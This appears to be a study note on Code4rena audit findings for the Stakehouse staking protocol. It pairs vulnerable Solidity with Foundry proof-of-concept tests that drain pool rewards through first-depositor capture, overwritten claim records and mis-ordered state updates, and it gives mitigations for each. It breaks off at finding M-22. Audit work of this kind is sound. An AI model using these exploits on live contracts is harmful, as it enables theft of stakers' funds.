# 2022-11-Stakehouse Protocol
---
- Category: #liquid_staking #Dexes #CDP #services #cross-chain 
- Note Create 2025-03-10
- Platform: Code4rena
- Report Url: [2022-11-stakehouse](https://code4rena.com/reports/2022-11-stakehouse)
---
# Critical & High Risk Findings (xx)

---
## [H-01] Any user being the first to claim rewards from `GiantMevAndFeesPool` can unexepectedly collect them all
----
- **Tags**:  #business_logic 
- Number of finders: 1
- Difficulty: Hard
---
### Lines of code

[SyndicateRewardsProcessor.sol#L85](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85)
```
    /// @dev Internal logic for tracking accumulated ETH per share
    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {
        if (_numOfShares > 0) {
            uint256 received = totalRewardsReceived();
            uint256 unprocessed = received - totalETHSeen;
            if (unprocessed > 0) {
                emit ETHReceived(unprocessed);
                // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later
85:             accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;
                totalETHSeen = received;
            }
        }
    }
```

[SyndicateRewardsProcessor.sol#L61](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61)
```solidity
    function _distributeETHRewardsToUserForToken(
        address _user,
        address _token,
        uint256 _balance,
        address _recipient
    ) internal {
        require(_recipient != address(0), "Zero address");
        uint256 balance = _balance;
        if (balance > 0) {
            // Calculate how much ETH rewards the address is owed / due 
61:         uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
            if (due > 0) {
                claimed[_user][_token] = due;
                totalClaimed += due;
                (bool success, ) = _recipient.call{value: due}("");
                require(success, "Failed to transfer");
                emit ETHDistributed(_user, _recipient, due);
            }
        }
    }
```

[GiantMevAndFeesPool.sol#L203](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203)
```solidity
    function _setClaimedToMax(address _user) internal {
        // New ETH stakers are not entitled to ETH earned by
        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;
    }
```
### Impact

Any user being the first to claim rewards from `GiantMevAndFeesPool`, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards...
### Proof of Concept

`GiantPoolWithdrawTests`
```solidity
pragma solidity ^0.8.13;

// SPDX-License-Identifier: MIT

import "forge-std/console.sol";
import { TestUtils } from "../utils/TestUtils.sol";
import { GiantSavETHVaultPool } from "../../contracts/liquid-staking/GiantSavETHVaultPool.sol";
import { GiantMevAndFeesPool } from "../../contracts/liquid-staking/GiantMevAndFeesPool.sol";
import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";
import { MockSlotRegistry } from "../../contracts/testing/stakehouse/MockSlotRegistry.sol";
import { MockSavETHVault } from "../../contracts/testing/liquid-staking/MockSavETHVault.sol";
import { MockGiantSavETHVaultPool } from "../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { MockLiquidStakingManager } from "../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol";

// NoopContract is a contract that does nothing but that is necessary to pass some require statements.
contract NoopContract {
    function claimRewards(
        address _recipient,
        bytes[] calldata _blsPubKeys
    ) external {
        // does nothing, just to pass the for loop
    }
}

contract GiantPoolWithdrawTests is TestUtils {
    MockGiantSavETHVaultPool public giantSavETHPool;
    GiantMevAndFeesPool public giantFeesAndMevPool;
    MockLiquidStakingManager public liquidStakingManager;
    NoopContract public noopContract;

    function setUp() public {
        noopContract = new NoopContract();

        vm.startPrank(accountFive); // this will mean it gets dETH initial supply
        factory = createMockLSDNFactory();
        vm.stopPrank();

        // Deploy 1 network
        manager = deployNewLiquidStakingNetwork(
            factory,
            admin,
            true,
            "LSDN"
        );
        liquidStakingManager = manager;
        savETHVault = MockSavETHVault(address(manager.savETHVault()));
        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken());
        giantFeesAndMevPool = new GiantMevAndFeesPool(factory);
    }

    /*  In this test case, the first comer depositing into the giant pool can collect all the rewards already collected
     *  whatever the amount even if it has not contributed to generate them. Is it expected?
     *  Severity: Critical
     *
     *  Remediation:
     *    The calculation of the state, i.e., claimed AND accumulatedETHPerLPShare must happen after the token transfer instead of before.
     *
     */
    function testFirstComerSwipeRewards() public {
        // Set up users and ETH
        address rewarder = accountThree; vm.deal(rewarder, 10 ether);
        address hacker = accountTwo; vm.deal(hacker, 1 ether);
        uint256 rewards = 5 ether;

        // rewards the pool
        vm.prank(rewarder); payable(giantFeesAndMevPool).transfer(rewards);

        vm.startPrank(hacker);
        giantFeesAndMevPool.depositETH{value: 0.001 ether}(0.001 ether);

        // Hacker can claim the 5 ether even if he did not contribute to receive it...
        assertRewardsClaimed(hacker, rewards);
    }

    // claimRewards claims the rewards with crafted inputs to passe some require statements.
    function claimRewards(address _recipient) private {
        address[] memory _stakingFundsVaults = new address[](1);
        bytes[][] memory _blsPublicKeysForKnots = new bytes[][](1);
        _stakingFundsVaults[0] = address(noopContract);
        giantFeesAndMevPool.claimRewards(_recipient, _stakingFundsVaults, _blsPublicKeysForKnots);
    }

    // assertRewardsClaimed claim rewards and check if it changed the balance of the account.
    function assertRewardsClaimed(address _recipient, uint256 expectedReward) public {
        uint256 beforeBalance = address(_recipient).balance;
        claimRewards(_recipient);
        uint256 afterBalance = address(_recipient).balance;
        // as you can see, nothing as been withdrawn...
        assertEq(afterBalance - beforeBalance, expectedReward);
    }
}
```

### Recommended Mitigation

Rework the way `accumulatedETHPerLPShare` and `claimed` is used. There are multiple bugs due to the interaction between those variables as you will see in my other reports.

### Discussion

### Notes

The core vulnerability is indeed about how to properly handle rewards that arrive before any users have deposited into the pool.

The contract's reward distribution logic would work correctly if one of these conditions were true:

1. No rewards came in before the first deposit (initial reward = 0)
2. The contract had logic to properly handle pre-deposit rewards.
### Tools
### Refine

- [[1-Business_Logic]]

---
## [H-03] Theft of ETH of free floating SLOT holders
----
- **Tags**: #business_logic 
- Number of finders: 2
- Difficulty: Hard
---
### Lines of code

[Syndicate.sol#L369](https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369)
```solidity
    function calculateUnclaimedFreeFloatingETHShare(bytes memory _blsPubKey, address _user) public view returns (uint256) {
        // Check the user has staked sETH for the KNOT
        uint256 stakedBal = sETHStakedBalanceForKnot[_blsPubKey][_user];
        if (stakedBal < 1 gwei) revert FreeFloatingStakeAmountTooSmall();
        // Get the amount of ETH eligible for the user based on their staking amount
        uint256 accumulatedETHPerShare = _getCorrectAccumulatedETHPerFreeFloatingShareForBLSPublicKey(_blsPubKey);
        uint256 userShare = (accumulatedETHPerShare * stakedBal) / PRECISION;
        // Calculate how much their unclaimed share of ETH is based on total ETH claimed so far
369:    return userShare - sETHUserClaimForKnot[_blsPubKey][_user];
    }
```

[Syndicate.sol#L668](https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668)
```solidity
   (bool success,) = _recipient.call{value: unclaimedUserShare}("");
```

[Syndicate.sol#L228](https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228)
```solidity
    sETHUserClaimForKnot[_blsPubKey][_onBehalfOf] = (_sETHAmount * accumulatedETHPerFreeFloatingShare) / PRECISION;
```
### Impact

A malicious user can steal all claimable ETH belonging to free floating SLOT holders...
### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { console } from "forge-std/console.sol";
import { MockERC20 } from "../../contracts/testing/MockERC20.sol";
import { SyndicateMock } from "../../contracts/testing/syndicate/SyndicateMock.sol";
import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol";
import { MockTransactionRouter } from "../../contracts/testing/stakehouse/MockTransactionRouter.sol";
import { MockSlotRegistry } from "../../contracts/testing/stakehouse/MockSlotRegistry.sol";
import { MockStakeHouseUniverse } from "../../contracts/testing/stakehouse/MockStakeHouseUniverse.sol";
import { SyndicateFactoryMock } from "../../contracts/testing/syndicate/SyndicateFactoryMock.sol";
import {
    KnotIsFullyStakedWithFreeFloatingSlotTokens,
    KnotIsAlreadyRegistered
} from "../../contracts/syndicate/SyndicateErrors.sol";
import { TestUtils } from "../utils/TestUtils.sol";

contract SyndicateTest is TestUtils {
    MockERC20 public sETH;
    SyndicateFactoryMock public syndicateFactory;
    SyndicateMock public syndicate;
    function blsPubKeyOneAsArray() public view returns (bytes[] memory) {
        bytes[] memory keys = new bytes[](1);
        keys[0] = blsPubKeyOne;
        return keys;
    }
    function sendEIP1559RewardsToSyndicate(uint256 eip1559Reward) public {
        (bool success, ) = address(syndicate).call{value: eip1559Reward}("");
        assertEq(success, true);
    }
    function setUp() public {
        // Deploy an sETH token for an arbitrary stakehouse
        sETH = new MockERC20("sETH", "sETH", accountOne);
        // Deploy the syndicate but no priority stakers are required
        address[] memory priorityStakers = new address[](0);
        // Create and inject mock stakehouse dependencies
        address accountMan = address(new MockAccountManager());
        address txRouter = address(new MockTransactionRouter());
        address uni = address(new MockStakeHouseUniverse());
        address slot = address(new MockSlotRegistry());
        syndicateFactory = new SyndicateFactoryMock(
            accountMan,
            txRouter,
            uni,
            slot
        );
        address payable _syndicate = payable(syndicateFactory.deployMockSyndicate(
            admin,
            0, // No priority staking block
            priorityStakers,
            blsPubKeyOneAsArray()
        ));
        syndicate = SyndicateMock(_syndicate);
        // Config mock stakehouse contracts
        MockSlotRegistry(syndicate.slotReg()).setShareTokenForHouse(houseOne, address(sETH));
	    MockStakeHouseUniverse(syndicate.uni()).setAssociatedHouseForKnot(blsPubKeyOne, houseOne);
	    MockStakeHouseUniverse(syndicate.uni()).setAssociatedHouseForKnot(blsPubKeyTwo, houseOne);
 	    MockStakeHouseUniverse(syndicate.uni()).setAssociatedHouseForKnot(blsPubKeyThree, houseOne);
 	    MockSlotRegistry(syndicate.slotReg()).setNumberOfCollateralisedSlotOwnersForKnot(blsPubKeyOne, 1);
        MockSlotRegistry(syndicate.slotReg()).setNumberOfCollateralisedSlotOwnersForKnot(blsPubKeyTwo, 1);
        MockSlotRegistry(syndicate.slotReg()).setNumberOfCollateralisedSlotOwnersForKnot(blsPubKeyThree, 1);
        MockSlotRegistry(syndicate.slotReg()).setCollateralisedOwnerAtIndex(blsPubKeyOne, 0, accountTwo);
        MockSlotRegistry(syndicate.slotReg()).setCollateralisedOwnerAtIndex(blsPubKeyTwo, 0, accountFour);
        MockSlotRegistry(syndicate.slotReg()).setCollateralisedOwnerAtIndex(blsPubKeyThree, 0, accountFive);
        MockSlotRegistry(syndicate.slotReg()).setUserCollateralisedSLOTBalanceForKnot(houseOne, accountTwo, blsPubKeyOne, 4 ether);
        MockSlotRegistry(syndicate.slotReg()).setUserCollateralisedSLOTBalanceForKnot(houseOne, accountFour, blsPubKeyTwo, 4 ether);
        MockSlotRegistry(syndicate.slotReg()).setUserCollateralisedSLOTBalanceForKnot(houseOne, accountFive, blsPubKeyThree, 4 ether);
    }
    function testUnexpectedClaimAsStaker() public {
        // Set up test - distribute sETH and register additional knot to syndicate
        vm.startPrank(admin);
        syndicate.registerKnotsToSyndicate(getBytesArrayFromBytes(blsPubKeyTwo));
        vm.stopPrank();

        vm.startPrank(accountOne);
        sETH.transfer(accountThree, 500 ether);
        sETH.transfer(accountFive, 500 ether);
        vm.stopPrank();

        // for bls pub key one we will have 2 stakers staking 50% each
        uint256 stakingAmount = 4 ether;
        uint256[] memory sETHAmounts = new uint256[](1);
        sETHAmounts[0] = stakingAmount;

        vm.startPrank(accountOne);
        sETH.approve(address(syndicate), stakingAmount);
        syndicate.stake(blsPubKeyOneAsArray(), sETHAmounts, accountOne);
        vm.stopPrank();

        vm.startPrank(accountThree);
        sETH.approve(address(syndicate), stakingAmount);
        syndicate.stake(blsPubKeyOneAsArray(), sETHAmounts, accountThree);
        vm.stopPrank();

        // send some rewards
        uint256 eipRewards = 1 ether;
        sendEIP1559RewardsToSyndicate(eipRewards);

        // The attack starts at this stage
        vm.startPrank(accountThree);

        assertEq(accountThree.balance, 0);
        syndicate.claimAsStaker(accountThree, getBytesArrayFromBytes(blsPubKeyOne));

        // at this stage the rewards are expected but let see if we can grab some more...
        assertEq(accountThree.balance, eipRewards / 4);

        // By sending the minimum amount of gwei, I can diminish `sETHUserClaimForKnot` which is used in the calculation in `calculateUnclaimedFreeFloatingETHShare`
        // that eventually drives the staker claims.
        sETHAmounts[0] = 1 gwei;

        // we record the balance of sETH to check eventually that we have not lost anything the invested amount to perform the attack.
        uint256 sETHBalanceBefore = sETH.balanceOf(accountThree);
        sETH.approve(address(syndicate), sETHAmounts[0]);
        // and stake the minimum amount to manipulate `sETHUserClaimForKnot`.
        syndicate.stake(blsPubKeyOneAsArray(), sETHAmounts, accountThree);

        // claim again and check if we collected more. Yes, we doubled...
        syndicate.claimAsStaker(accountThree, getBytesArrayFromBytes(blsPubKeyOne));
        assertEq(accountThree.balance, eipRewards / 2);

        // now we can unstake the invested amount
        syndicate.unstake(accountThree, accountThree, blsPubKeyOneAsArray(), sETHAmounts);
        assertEq(accountThree.balance, eipRewards / 2);
        uint256 sETHBalanceAfter = sETH.balanceOf(accountThree);

        // let see if we can do some more. Yes, we can... So that way we could drain all rewards...
        sETH.approve(address(syndicate), sETHAmounts[0]);
        syndicate.stake(blsPubKeyOneAsArray(), sETHAmounts, accountThree);
        syndicate.claimAsStaker(accountThree, getBytesArrayFromBytes(blsPubKeyOne));
        assertEq(accountThree.balance, (eipRewards / 4) * 3);

        // check that the balance of sETH is as before the attack, we have not lost anything during the attack.
        assertEq(sETHBalanceAfter, sETHBalanceBefore);
    }
}
```
### Recommended Mitigation

`+=` operator instead of `=` in
```solidity
            sETHUserClaimForKnot[_blsPubKey][_onBehalfOf] = (_sETHAmount * accumulatedETHPerFreeFloatingShare) / PRECISION;
```

The logic for keeping the rewards up-to-date is also quite complex in my opinion. The main thing that triggered it for me was the lazy call to `updateAccruedETHPerShares`. Why not keeping the state updated after each operation instead?

### Discussion

### Notes

#### Notes 
When a user makes additional stakes, the contract **overwrites** their previous claim record instead of adding to it.
#### Impressions
**Always ensure proper accounting in cumulative financial systems**.

### Tools
### Refine

- [[1-Business_Logic]]

---
## [H-08] function `withdrawETH` from `GiantMevAndFeesPool` can steal most of `eth` because of `idleETH` is reduced before burning token
----
- **Tags**:  #business_logic #withdraw 
- Number of finders: 2
- Difficulty: Hard
---
### Impact

The contract `GiantMevAndFeesPool` override the function `totalRewardsReceived`:

```solidity
return address(this).balance + totalClaimed - idleETH;
```

The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP`

```solidity
uint256 received = totalRewardsReceived();
uint256 unprocessed = received - totalETHSeen;
```

But it will decrease the `idleETH` first and then burn the `lpTokenETH` in the function `GiantMevAndFeesPool.withdrawETH`. The `lpTokenETH` burn option will trigger `GiantMevAndFeesPool.beforeTokenTransfer` which will call `_updateAccumulatedETHPerLP` and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the `GiantMevAndFeesPool`.

[`withdrawETH`](https://github.com/code-423n4/2022-11-stakehouse/blob/08a34ed4505173e7cad2d3b2bde92863b61716c8/contracts/liquid-staking/GiantPoolBase.sol#L57-L60)
```solidity
        idleETH -= _amount;

        lpTokenETH.burn(msg.sender, _amount);
        (bool success,) = msg.sender.call{value: _amount}("");
```

### Proof of Concept

I wrote a test file for proof, but there is another `bug/vulnerability` which will make the `GiantMevAndFeesPool.withdrawETH` function break down. I submitted it as the other finding named "GiantLP with a transferHookProcessor cant be burned, users' funds will be stuck in the Giant Pool". You should fix it first by modifying the code

```solidity
if (_to != address(0)) {
    _distributeETHRewardsToUserForToken(
        _to,
        address(lpTokenETH),
        lpTokenETH.balanceOf(_to),
        _to
    );
}
```

I know modifying the project source code is controversial. Please believe me it's a bug needed to be fixed and it's independent of the current vulnerability.

test:  
`test/foundry/TakeFromGiantPools2.t.sol`

```solidity
pragma solidity ^0.8.13;

// SPDX-License-Identifier: MIT

import "forge-std/console.sol";
import {GiantPoolTests} from "./GiantPools.t.sol";

contract TakeFromGiantPools2 is GiantPoolTests {
    function testDWUpdateRate2() public{
        address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);
        address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);
        // Deposit ETH into giant fees and mev
        vm.startPrank(feesAndMevUserOne);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        vm.stopPrank();
        vm.startPrank(feesAndMevUserTwo);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        giantFeesAndMevPool.withdrawETH(4 ether);
        vm.stopPrank();
        console.log("user one:", getBalance(feesAndMevUserOne));
        console.log("user two(attacker):", getBalance(feesAndMevUserTwo));
        console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));
    }

    function getBalance(address addr) internal returns (uint){
        // just ETH
        return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);
    }

}
```

run test:

```solidity
forge test --match-test testDWUpdateRate2 -vvv
```

test log:

```solidity
Logs:
  user one: 0
  user two(attacker): 6000000000000000000
  giantFeesAndMevPool: 2000000000000000000
```

The attacker stole 2 eth from the pool.

### Recommended Mitigation

`idleETH -= _amount;` should be after the `lpTokenETH.burn`.

### Discussion

### Notes

The issue revolves around the sequence of operations in the `withdrawETH` function:

1. The contract first decreases `idleETH` by the withdrawal amount
2. Then it burns the LP tokens
3. Finally, it transfers ETH to the user

The problem occurs because the token burning process triggers a hook function `beforeTokenTransfer` which calls `_updateAccumulatedETHPerLP` to calculate and distribute accumulated rewards.

Since `idleETH` is already reduced before the rewards calculation happens, this creates an artificial inflation in the calculated rewards. The formula for total rewards (`totalRewardsReceived()`) is:

```solidity
return address(this).balance + totalClaimed - idleETH;
```

By reducing `idleETH` first, the calculation sees more rewards than actually exist, creating "rewards out of thin air" that can be claimed by an attacker.
#### Impressions
State variables must be updated in the correct sequence, especially when those variables are used in financial calculations that might be triggered by subsequent operations in the same function.

### Tools
### Refine

- [[1-Business_Logic]]

---
# Medium Risk Findings (xx)

---
## [M-21] EIP1559 rewards received by syndicate during the period when it has no registered knots can be lost
----
- **Tags**: #business_logic #Do_not_update_state 
- Number of finders: 1
- Difficulty: Hard
---
### Impact

When the `deRegisterKnotFromSyndicate` function is called by the DAO, the `_deRegisterKnot` function is eventually called to execute `numberOfRegisteredKnots -= 1`. It is possible that `numberOfRegisteredKnots` is reduced to 0. During the period when the syndicate has no registered knots, the EIP1559 rewards that are received by the syndicate remain in the syndicate since functions like `updateAccruedETHPerShares` do not include any logics for handling such rewards received by the syndicate. Later, when a new knot is registered and mints the derivatives, the node runner can call the `claimRewardsAsNodeRunner` function to receive half ot these rewards received by the syndicate during the period when it has no registered knots. Yet, because such rewards are received by the syndicate before the new knot mints the derivatives, the node runner should not be entitled to these rewards. Moreover, due to the issue mentioned in my other finding titled "Staking Funds vault's LP holder cannot claim EIP1559 rewards after derivatives are minted for a new BLS public key that is not the first BLS public key registered for syndicate", calling the `StakingFundsVault.claimRewards` function by the Staking Funds vault's LP holder reverts so the other half of such rewards is locked in the syndicate. Even if calling the `StakingFundsVault.claimRewards` function by the Staking Funds vault's LP holder does not revert, the Staking Funds vault's LP holder does not deserve the other half of such rewards because these rewards are received by the syndicate before the new knot mints the derivatives. Because these EIP1559 rewards received by the syndicate during the period when it has no registered knots can be unfairly sent to the node runner or remain locked in the syndicate, such rewards are lost.

[LiquidStakingManager.sol#L218-L220](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L218-L220)
```solidity
    function deRegisterKnotFromSyndicate(bytes[] calldata _blsPublicKeys) external onlyDAO {
        Syndicate(payable(syndicate)).deRegisterKnots(_blsPublicKeys);
    }
```

[Syndicate.sol#L154-L157](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L154-L157)
```solidity
    function deRegisterKnots(bytes[] calldata _blsPublicKeys) external onlyOwner {
        updateAccruedETHPerShares();
        _deRegisterKnots(_blsPublicKeys);
    }
```

[Syndicate.sol#L597-L607](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L597-L607)
```solidity
    function _deRegisterKnots(bytes[] calldata _blsPublicKeys) internal {
        for (uint256 i; i < _blsPublicKeys.length; ++i) {
            bytes memory blsPublicKey = _blsPublicKeys[i];

            // Do one final snapshot of ETH owed to the collateralized SLOT owners so they can claim later
            _updateCollateralizedSlotOwnersLiabilitySnapshot(blsPublicKey);

            // Execute the business logic for de-registering the single knot
            _deRegisterKnot(blsPublicKey);
        }
    }
```

[Syndicate.sol#L610-L627](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L610-L627)
```solidity
    function _deRegisterKnot(bytes memory _blsPublicKey) internal {
        if (isKnotRegistered[_blsPublicKey] == false) revert KnotIsNotRegisteredWithSyndicate();
        if (isNoLongerPartOfSyndicate[_blsPublicKey] == true) revert KnotHasAlreadyBeenDeRegistered();

        // We flag that the knot is no longer part of the syndicate
        isNoLongerPartOfSyndicate[_blsPublicKey] = true;

        // For the free floating and collateralized SLOT of the knot, snapshot the accumulated ETH per share
        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] = accumulatedETHPerFreeFloatingShare;

        // We need to reduce `totalFreeFloatingShares` in order to avoid further ETH accruing to shares of de-registered knot
        totalFreeFloatingShares -= sETHTotalStakeForKnot[_blsPublicKey];

        // Total number of registered knots with the syndicate reduces by one
        numberOfRegisteredKnots -= 1;

        emit KnotDeRegistered(_blsPublicKey);
    }
```

[Syndicate.sol#L174-L197](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L174-L197)
```solidity
    function updateAccruedETHPerShares() public {
        ...
        if (numberOfRegisteredKnots > 0) {
            ...
        } else {
            // todo - check else case for any ETH lost
        }
    }
```

### Proof of Concept

Please add the following code in `test\foundry\LiquidStakingManager.t.sol`.

1. Import `stdError` as follows.
```solidity
import { stdError } from "forge-std/Test.sol";
```

1. Add the following test. This test will pass to demonstrate the described scenario.
```solidity
    function testEIP1559RewardsReceivedBySyndicateDuringPeriodWhenItHasNoRegisteredKnotsCanBeLost() public {
        // set up users and ETH
        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);
        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);
        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);

        // do everything from funding a validator within default LSDN to minting derivatives
        depositStakeAndMintDerivativesForDefaultNetwork(
            nodeRunner,
            feesAndMevUser,
            savETHUser,
            blsPubKeyFour
        );

        // send the syndicate some EIP1559 rewards
        uint256 eip1559Tips = 0.6743 ether;
        (bool success, ) = manager.syndicate().call{value: eip1559Tips}("");
        assertEq(success, true);

        // de-register the only knot from the syndicate to send sETH back to the smart wallet
        IERC20 sETH = IERC20(MockSlotRegistry(factory.slot()).stakeHouseShareTokens(manager.stakehouse()));
        uint256 sETHBalanceBefore = sETH.balanceOf(manager.smartWalletOfNodeRunner(nodeRunner));
        vm.startPrank(admin);
        manager.deRegisterKnotFromSyndicate(getBytesArrayFromBytes(blsPubKeyFour));
        manager.restoreFreeFloatingSharesToSmartWalletForRageQuit(
            manager.smartWalletOfNodeRunner(nodeRunner),
            getBytesArrayFromBytes(blsPubKeyFour),
            getUint256ArrayFromValues(12 ether)
        );
        vm.stopPrank();

        assertEq(
            sETH.balanceOf(manager.smartWalletOfNodeRunner(nodeRunner)) - sETHBalanceBefore,
            12 ether
        );

        vm.warp(block.timestamp + 3 hours);

        // feesAndMevUser, who is the Staking Funds vault's LP holder, can claim rewards accrued up to the point of pulling the plug
        vm.startPrank(feesAndMevUser);
        stakingFundsVault.claimRewards(feesAndMevUser, getBytesArrayFromBytes(blsPubKeyFour));
        vm.stopPrank();

        uint256 feesAndMevUserEthBalanceBefore = feesAndMevUser.balance;
        assertEq(feesAndMevUserEthBalanceBefore, (eip1559Tips / 2) - 1);

        // nodeRunner, who is the collateralized SLOT holder for blsPubKeyFour, can claim rewards accrued up to the point of pulling the plug
        vm.startPrank(nodeRunner);
        manager.claimRewardsAsNodeRunner(nodeRunner, getBytesArrayFromBytes(blsPubKeyFour));
        vm.stopPrank();
        assertEq(nodeRunner.balance, (eip1559Tips / 2));

        // more EIP1559 rewards are sent to the syndicate, which has no registered knot at this moment        
        (success, ) = manager.syndicate().call{value: eip1559Tips}("");
        assertEq(success, true);

        vm.warp(block.timestamp + 3 hours);

        // calling the claimRewards function by feesAndMevUser has no effect at this moment
        vm.startPrank(feesAndMevUser);
        stakingFundsVault.claimRewards(feesAndMevUser, getBytesArrayFromBytes(blsPubKeyFour));
        vm.stopPrank();
        assertEq(feesAndMevUser.balance, feesAndMevUserEthBalanceBefore);

        // calling the claimRewardsAsNodeRunner function by nodeRunner reverts at this moment
        vm.startPrank(nodeRunner);
        vm.expectRevert("Nothing received");
        manager.claimRewardsAsNodeRunner(nodeRunner, getBytesArrayFromBytes(blsPubKeyFour));
        vm.stopPrank();

        // however, the syndicate still holds the EIP1559 rewards received by it during the period when the only knot was de-registered
        assertEq(manager.syndicate().balance, eip1559Tips + 1);

        vm.warp(block.timestamp + 3 hours);

        vm.deal(nodeRunner, 4 ether);
        vm.deal(feesAndMevUser, 4 ether);
        vm.deal(savETHUser, 24 ether);

        // For a different BLS public key, which is blsPubKeyTwo, 
        //   do everything from funding a validator within default LSDN to minting derivatives.
        depositStakeAndMintDerivativesForDefaultNetwork(
            nodeRunner,
            feesAndMevUser,
            savETHUser,
            blsPubKeyTwo
        );

        // calling the claimRewards function by feesAndMevUser reverts at this moment
        vm.startPrank(feesAndMevUser);
        vm.expectRevert(stdError.arithmeticError);
        stakingFundsVault.claimRewards(feesAndMevUser, getBytesArrayFromBytes(blsPubKeyTwo));
        vm.stopPrank();

        // Yet, calling the claimRewardsAsNodeRunner function by nodeRunner receives half of the EIP1559 rewards
        //   received by the syndicate during the period when it has no registered knots.
        // Because such rewards are not received by the syndicate after the derivatives are minted for blsPubKeyTwo,
        //   nodeRunner does not deserve these for blsPubKeyTwo. 
        vm.startPrank(nodeRunner);
        manager.claimRewardsAsNodeRunner(nodeRunner, getBytesArrayFromBytes(blsPubKeyTwo));
        vm.stopPrank();
        assertEq(nodeRunner.balance, eip1559Tips / 2);

        // Still, half of the EIP1559 rewards that were received by the syndicate
        //   during the period when the syndicate has no registered knots is locked in the syndicate.
        assertEq(manager.syndicate().balance, eip1559Tips / 2 + 1);
    }
```
### Recommended Mitigation

The `else` block of the `updateAccruedETHPerShares` function can be updated to include logics that handle the EIP1559 rewards received by the syndicate during the period when it has no registered knots.

[Syndicate.sol#L194-L196](https://github.com/code-423n4/2022-11-stakehouse/blob/08a34ed4505173e7cad2d3b2bde92863b61716c8/contracts/syndicate/Syndicate.sol#L194-L196)
```solidity
        } else {
            // todo - check else case for any ETH lost
        }
```

### Discussion

### Notes & Impressions

#### Simplified Bank Account Analogy

Imagine a bank with a special type of shared business account system that works like this:

1. **The Account Setup**:
    - Company A opens a business account with 3 registered employees (Alice, Bob, and Charlie)
    - Any money deposited into this account is automatically split between the employees and the company
    - Employees get 50% to split among themselves, and the company gets 50%
2. **The Normal Flow**:
    - A customer pays $300 to the business account
    - Each employee gets $50 (total $150 for employees)
    - The company gets $150
    - Everyone is happy because the system worked as intended
3. **The Vulnerability**:
    - All three employees leave the company (they're "deregistered")
    - During this period with zero employees, another customer pays $300 to the business account
    - The bank's software has no logic to handle payments when there are zero employees
    - The money sits in a limbo state within the account
4. **The Exploit**:
    - A new employee, Dave, joins the company
    - Dave checks his account and discovers he can claim $150 (50% of the $300 that came in while no employees were registered)
    - The company can't claim their share due to a separate bug in the system
    - Dave gets money he didn't earn, and half the money is permanently stuck


The `updateAccruedETHPerShares()` function is supposed to distribute rewards, but it has an empty `else` block for the case when there are no registered knots:

```solidity
function updateAccruedETHPerShares() public {
    // Logic for when there are registered knots
    if (numberOfRegisteredKnots > 0) {
        // Detailed distribution logic here
        // ...
    } else {
        // todo - check else case for any ETH lost
        // THIS IS EMPTY! No handling for rewards received during this period
    }
}
```
#### Impressions

**Always handle all possible states of your system, especially edge cases like "zero" or "empty" states**.

### Tools
### Refine
- [[1-Business_Logic]]
- [[12-Do_not_Update_state]]

---
## [M-22] ETH sent when calling executeAsSmartWallet function can be lost
----
- **Tags**: #business_logic #refund_ether
- Number of finders: 2
- Difficulty: Hard
---
### Impact

